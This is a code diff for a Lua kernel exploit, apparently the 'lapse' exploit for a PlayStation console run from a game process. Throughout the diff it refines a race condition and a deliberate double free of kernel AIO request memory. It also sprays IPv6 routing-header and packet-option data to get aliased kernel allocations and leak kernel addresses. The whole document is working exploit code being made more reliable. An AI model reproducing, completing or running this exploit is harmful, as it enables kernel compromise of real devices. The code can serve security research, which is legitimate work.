@@ -300,8 +300,8 @@ NUM_WORKERS = 2
 NUM_GROOMS = 0x200
 NUM_HANDLES = 0x100
 NUM_RACES = 100
-NUM_SDS = 64 -- TODO: change back to 0x100
-NUM_ALIAS = 200
+NUM_SDS = 64
+NUM_ALIAS = 100
 LEAK_LEN = 16
 NUM_LEAKS = 5
 NUM_CLOBBERS = 8
@@ -316,7 +316,7 @@ MAX_AIO_IDS = 0x80
 AIO_ERRORS = memory.alloc(4 * MAX_AIO_IDS)
 
 
-
+SCE_KERNEL_ERROR_ESRCH = 0x80020003
 
 
 
@@ -403,17 +403,33 @@ function aio_multi_wait(ids, num_ids, states, mode, timeout)
 end
 
 function new_socket()
-    return syscall.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+    local sd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+    if sd == -1 then
+        error("new_socket() error: " .. get_error_string())
+    end
+    return sd
 end
 
 function new_tcp_socket()
-    return syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
+    local sd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
+    if sd == -1 then
+        error("new_tcp_socket() error: " .. get_error_string())
+    end
+    return sd
+end
+
+function ssockopt(sd, level, optname, optval, optlen)
+    if syscall.setsockopt(sd, level, optname, optval, optlen):tonumber() == -1 then
+        error("setsockopt() error: " .. get_error_string())
+    end
 end
 
 function gsockopt(sd, level, optname, optval, optlen)
     local size = memory.alloc(8)
     memory.write_dword(size, optlen)
-    syscall.getsockopt(sd, level, optname, optval, size)
+    if syscall.getsockopt(sd, level, optname, optval, size):tonumber() == -1 then
+        error("getsockopt() error: " .. get_error_string())
+    end
     return memory.read_dword(size):tonumber()
 end
 
@@ -437,10 +453,6 @@ function spray_aio(loops, reqs1, num_reqs, ids, multi, cmd)
     for i=0, loops-1 do
         aio_submit_cmd(cmd, reqs1, num_reqs, ids + (i * step))
     end
-end
-
-function poll_aio(ids, states, num_ids)
-    aio_multi_poll(ids, num_ids, states)
 end
 
 function cancel_aios(ids, num_ids)
@@ -670,8 +682,6 @@ function race_one(request_addr, tcp_sd, sds)
     local tcp_state = memory.read_byte(info_buf):tonumber()
     dbg("tcp state: " .. hex(tcp_state))
 
-    local SCE_KERNEL_ERROR_ESRCH = 0x80020003  -- No such process
-    
     local won_race = false
 
     -- to win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
@@ -727,16 +737,16 @@ end
 
 
 function get_rthdr(sd, buf, len)
-    gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
+    return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
 end
 
 function set_rthdr(sd, buf, len)
-    syscall.setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
+    ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
 end
 
 function free_rthdrs(sds)
     for _, sd in ipairs(sds) do
-        syscall.setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+        ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
     end
 end
 
@@ -750,12 +760,12 @@ function make_aliased_rthdrs(sds)
 
     for loop=1,NUM_ALIAS do
 
-        for i=1,NUM_SDS do
+        for i=1, NUM_SDS do
             memory.write_dword(buf + marker_offset, i)
             set_rthdr(sds[i], buf, rsize)
         end
 
-        for i=1,NUM_SDS do
+        for i=1, NUM_SDS do
             get_rthdr(sds[i], buf, size)
             local marker = memory.read_dword(buf + marker_offset):tonumber()
             -- dbgf("loop[%d] -- sds[%d] = %s", loop, i, hex(marker))
@@ -766,8 +776,7 @@ function make_aliased_rthdrs(sds)
                 table.remove(sds, i) -- we're assuming marker > i, or else indexing will change
                 free_rthdrs(sds)
                 for i=1,2 do
-                    local sock_fd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
-                    table.insert(sds, sock_fd)
+                    table.insert(sds, new_socket())
                 end
                 return sd_pair
             end
@@ -800,17 +809,13 @@ function double_free_reqs2(sds)
     memory.write_word(server_addr + 2, htons(5050)) -- sin_port
     memory.write_dword(server_addr + 4, aton("127.0.0.1"))
 
-    local sd_listen = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
-    if sd_listen == -1 then
-        error("socket() error: " .. get_error_string())
-    end
+    local sd_listen = new_tcp_socket()
+    dbgf("sd_listen: %d", sd_listen)
 
     local enable = memory.alloc(4)
     memory.write_dword(enable, 1)
 
-    if syscall.setsockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4):tonumber() == -1 then
-        error("setsockopt() error: " .. get_error_string())
-    end
+    ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4)
     
     if syscall.bind(sd_listen, server_addr, 16):tonumber() == -1 then
         error("bind() error: " .. get_error_string())
@@ -819,8 +824,6 @@ function double_free_reqs2(sds)
     if syscall.listen(sd_listen, 1):tonumber() == -1 then
         error("listen() error: " .. get_error_string())
     end
-
-    dbgf("sd_listen: %d", sd_listen)
 
     -- 2. start the race
 
@@ -833,11 +836,7 @@ function double_free_reqs2(sds)
 
     for i=1,NUM_RACES do
 
-        local sd_client = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
-        if sd_client == -1 then
-            error("socket() error: " .. get_error_string())
-        end
-
+        local sd_client = new_tcp_socket()
         dbgf("sd_client: %d", sd_client)
 
         if syscall.connect(sd_client, server_addr, 16):tonumber() == -1 then
@@ -856,9 +855,7 @@ function double_free_reqs2(sds)
         memory.write_dword(linger_buf+4, 1) -- l_linger - how many seconds to linger for
 
         -- force soclose() to sleep
-        if syscall.setsockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8):tonumber() == -1 then
-            error("setsockopt() error: " .. get_error_string())
-        end
+        ssockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8)
 
         memory.write_dword(reqs1 + which_req*0x28 + 0x20, sd_client)
 
@@ -1109,7 +1106,6 @@ function leak_kernel_addrs(sd_pair)
     dbg(memory.hex_dump(buf + reqs2_off, 0x80))
 
     local reqs1_addr = memory.read_qword(buf + reqs2_off + 0x10)
-    -- dbgf("reqs1_addr = %s", hex(reqs1_addr))
     reqs1_addr = bit64.band(reqs1_addr, bit64.bnot(0xff))
     printf("reqs1_addr = %s", hex(reqs1_addr))
 
@@ -1128,6 +1124,8 @@ function leak_kernel_addrs(sd_pair)
         if state == AIO_STATE_ABORTED then
             
             target_id = memory.read_dword(leak_ids + i*4):tonumber()
+            memory.write_dword(leak_ids + i*4, 0)
+
             printf("found target_id=%s, i=%d, batch=%d", hex(target_id), i, i / num_elems)
             
             local start = i + num_elems
@@ -1149,19 +1147,19 @@ function leak_kernel_addrs(sd_pair)
 end
 
 function make_aliased_pktopts(sds)
+
     local tclass = memory.alloc(4)
-    for loop = 0, NUM_ALIAS do
+
+    for loop = 1, NUM_ALIAS do
+
         for i=1, NUM_SDS do
             memory.write_dword(tclass, i)
-
-            if syscall.setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4):tonumber() == -1 then
-                error("setsockopt() error: " .. get_error_string())
-            end
+            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
         end
 
         for i=1, NUM_SDS do
             gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
-            local marker = memory.read_dword(tclass);
+            local marker = memory.read_dword(tclass):tonumber()
             if marker ~= i then
                 local sd_pair = { sds[i], sds[marker] }
                 printf("aliased pktopts at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
@@ -1170,10 +1168,8 @@ function make_aliased_pktopts(sds)
                 -- add pktopts to the new sockets now while new allocs can't
                 -- use the double freed memory
                 for i=1,2 do
-                    local sock_fd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
-                    if syscall.setsockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4):tonumber() == -1 then
-                        error("setsockopt() error: " .. get_error_string())
-                    end
+                    local sock_fd = new_socket()
+                    ssockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
                     table.insert(sds, sock_fd)
                 end
 
@@ -1182,18 +1178,16 @@ function make_aliased_pktopts(sds)
         end
 
         for i=1, NUM_SDS do
-            if syscall.setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0):tonumber() == -1 then
-                error("setsockopt() error: " .. get_error_string())
-            end
+            ssockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)
         end
     end
 
-    return nil
+    error('failed to make aliased pktopts');
 end
 
 function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
+    
     local max_leak_len = bit32.lshift(0xff + 1, 3)
-
     local buf = memory.alloc(max_leak_len)
 
     local num_elems = MAX_AIO_IDS
@@ -1207,12 +1201,14 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
     local aio_not_found = true
     free_evf(evf)
 
-    for i=0, num_clobbers - 1 do -- num_clobbers must be defined
+    for i=1, NUM_CLOBBERS do
+        
         spray_aio(num_batches, aio_reqs, num_elems, aio_ids)
 
-        -- JS: if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ)
-        -- Assumes 'buf' is an object with a :read32 method and sd, get_rthdr, AIO_CMD_READ are defined
-        if get_rthdr(sd, buf) == 8 and memory.read_dword(buf) == AIO_CMD_READ then
+        local size_ret = get_rthdr(sd, buf, max_leak_len)
+        local cmd = memory.read_dword(buf):tonumber()
+
+        if size_ret == 8 and cmd == AIO_CMD_READ then
             printf("aliased at attempt: %d", i)
             aio_not_found = false
             cancel_aios(aio_ids, aio_ids_len)
@@ -1268,39 +1264,107 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
     memory.write_qword(reqs2 + reqs3_offset + 0x38, 1)
 
     local states = memory.alloc(4 * num_elems)
-
-    local addr_cache = { aio_ids }
-
-    for i=1, num_batches - 1 do
-        -- Push the new address into the cache
+    local addr_cache = {}
+    for i=0, num_batches-1 do
         table.insert(addr_cache, aio_ids + bit32.lshift(i * num_elems, 2))
     end
 
     dbg("start overwrite AIO queue entry with rthdr loop")
-    local req_id = nil
+
     syscall.close(sd)
     sd = nil
 
-    -- TODO: num_alias loop here
+    local function reclaim_aio_query_with_rthdr()
 
+        for i=1, NUM_ALIAS do
+
+            for _, each_sd in ipairs(sds) do
+                set_rthdr(each_sd, reqs2, rsize)
+            end
+
+            for batch=1, #addr_cache do
+
+                for j=0,num_elems-1 do
+                    memory.write_dword(states + j*4, -1)
+                end
+
+                aio_multi_cancel(addr_cache[batch], num_elems, states)
+
+                local req_idx = -1
+                for j=0,num_elems-1 do
+                    local val = memory.read_dword(states + j*4):tonumber()
+                    if val == AIO_STATE_COMPLETE then
+                        req_idx = j
+                        break
+                    end
+                end
+
+                if req_idx ~= -1 then
+
+                    dbgf("states[%d] = %s", req_idx, hex(memory.read_dword(states + req_idx*4)))
+                    dbgf("found req_id at batch: %s", batch)
+                    printf("aliased at attempt: %d", i)
+
+                    local aio_idx = (batch-1) * num_elems + req_idx
+                    local req_id_p = aio_ids + aio_idx*4
+                    local req_id = memory.read_dword(req_id_p)
+                    
+                    dbgf("req_id = %s", hex(req_id))
+
+                    -- set .ar3_done to 1
+                    aio_multi_poll(req_id_p, 1, states)
+                    dbgf("states[%d] = %s", req_idx, hex(memory.read_dword(states + req_idx*4)))
+
+                    memory.write_dword(req_id_p, 0)
+
+                    for j=1, NUM_SDS do
+                        local sd2 = sds[j]
+                        get_rthdr(sd2, reqs2, reqs2_size)
+                        local done = memory.read_byte(reqs2 + reqs3_offset + 0xc):tonumber()
+                        if done > 0 then
+                            print(memory.hex_dump(reqs2, reqs2_size))
+                            sd = sd2
+                            table.remove(sds, j)
+                            free_rthdrs(sds)
+                            table.insert(sds, new_socket())
+                            break
+                        end
+                    end
+
+                    if sd == nil then
+                        error("can't find sd that overwrote AIO queue entry")
+                    end
+
+                    dbgf("sd: %d", sd)
+                    return req_id
+                end
+            end
+        end
+
+        return nil
+    end
+
+    local req_id = reclaim_aio_query_with_rthdr()
     if req_id == nil then
         error("failed to overwrite AIO queue entry")
     end
 
     free_aios2(aio_ids, aio_ids_len)
 
+    local target_id_p = memory.alloc(4)
+    memory.write_dword(target_id_p, target_id)
+
     -- enable deletion of target_id
-    poll_aio(target_id, states)
-    local states_val = memory.read_dword(states)
-    printf("target's state: %d", hex(states_val))
+    aio_multi_poll(target_id_p, 1, states)
+    printf("target's state: %s", hex(memory.read_dword(states)))
 
     local sce_errs = memory.alloc(8)
     memory.write_dword(sce_errs, -1)
     memory.write_dword(sce_errs+4, -1)
 
     local target_ids = memory.alloc(8)
-    memory.write_dword(sce_errs, req_id)
-    memory.write_dword(sce_errs+4, target_id)
+    memory.write_dword(target_ids, req_id)
+    memory.write_dword(target_ids+4, target_id)
 
     -- PANIC: double free on the 0x100 malloc zone. important kernel data may alias
     aio_multi_delete(target_ids, 2, sce_errs)
@@ -1311,39 +1375,52 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
     -- RESTORE: double freed memory has been reclaimed with harmless data
     -- PANIC: 0x100 malloc zone pointers aliased
     local sd_pair = make_aliased_pktopts(sds)
-    if sd_pair then
-        return {sd_pair, sd}
-    end
 
-    dbg("failed to make aliased pktopts")
-    local err_main_thr = memory.read_dword(sce_errs)
-    local err_worker_thr = memory.read_dword(sce_errs+4)
-    dbgf("delete errors: %s %s", hex(err_main_thr), hex(err_worker_thr))
+    local err1 = memory.read_dword(sce_errs):tonumber()
+    local err2 = memory.read_dword(sce_errs+4):tonumber()
+    dbgf("delete errors: %s %s", hex(err1), hex(err2))
 
     memory.write_dword(states, -1)
     memory.write_dword(states+4, -1)
 
-    poll_aio(target_ids, states)
+    aio_multi_poll(target_ids, 2, states)
     dbgf("target states: %s %s", hex(memory.read_dword(states)), hex(memory.read_dword(states+4)))
 
-    local SCE_KERNEL_ERROR_ESRCH = 0x80020003  -- No such process
     local success = true
-    if memory.read_dword(states) ~= SCE_KERNEL_ERROR_ESRCH then
+    if memory.read_dword(states):tonumber() ~= SCE_KERNEL_ERROR_ESRCH then
         print("ERROR: bad delete of corrupt AIO request")
         success = false
     end
-    if err_main_thr ~= 0 or err_main_thr ~= err_worker_thr then
-        log("ERROR: bad delete of ID pair")
+
+    if err1 ~= 0 or err1 ~= err2 then
+        print("ERROR: bad delete of ID pair")
         success = false
     end
 
     if not success then
         error("ERROR: double free on a 0x100 malloc zone failed")
     end
+
+    return sd_pair, sd
+
+end
+
+function print_info()
+
+    print("lapse exploit\n")
+    printf("running on %s %s", PLATFORM, FW_VERSION)
+    printf("game @ %s\n", game_name)
+
+    dbgf("eboot base @ %s", hex(eboot_base))
+    dbgf("libc base @ %s", hex(libc_base))
+    dbgf("libkernel base @ %s\n", hex(libkernel_base))
+
 end
 
 
 function kexploit()
+
+    print_info()
 
     -- pin to 1 core so that we only use 1 per-cpu bucket.
     -- this will make heap spraying and grooming easier
@@ -1365,9 +1442,8 @@ function kexploit()
     dbgf("block_fd %d unblocked_fd %d", block_fd, unblock_fd)
 
     -- NOTE: on game process, only < 130? sockets can be created, otherwise we'll hit limit error
-    for i=1,NUM_SDS do
-        local sock_fd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
-        table.insert(sds, sock_fd)
+    for i=1, NUM_SDS do
+        table.insert(sds, new_socket())
     end
 
     local block_id, groom_ids = nil, nil
@@ -1384,6 +1460,10 @@ function kexploit()
         print("\n[+] Leak kernel addresses\n")
         local reqs1_addr, kbuf_addr, kernel_addr, target_id, evf
             = leak_kernel_addrs(sd_pair)
+
+        print("\n[+] Double free SceKernelAioRWRequest\n")
+        local pktopts_sds, dirty_sd
+            = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[1], sds)
     
     end)
 
